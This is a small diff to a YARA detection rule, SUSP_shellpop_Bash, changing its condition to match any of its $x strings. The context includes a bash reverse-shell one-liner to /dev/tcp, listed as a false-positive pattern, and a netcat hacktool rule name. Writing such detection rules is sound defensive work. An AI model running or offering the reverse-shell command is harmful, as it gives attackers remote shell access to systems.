@@ -4412,7 +4412,7 @@ rule SUSP_shellpop_Bash {
 
       $fp1 = "bash -i >& /dev/tcp/IP/PORT" ascii
    condition:
-      $x1 and not 1 of ($fp*)
+      1 of ($x*) and not 1 of ($fp*)
 }
 
 rule HKTL_shellpop_netcat {
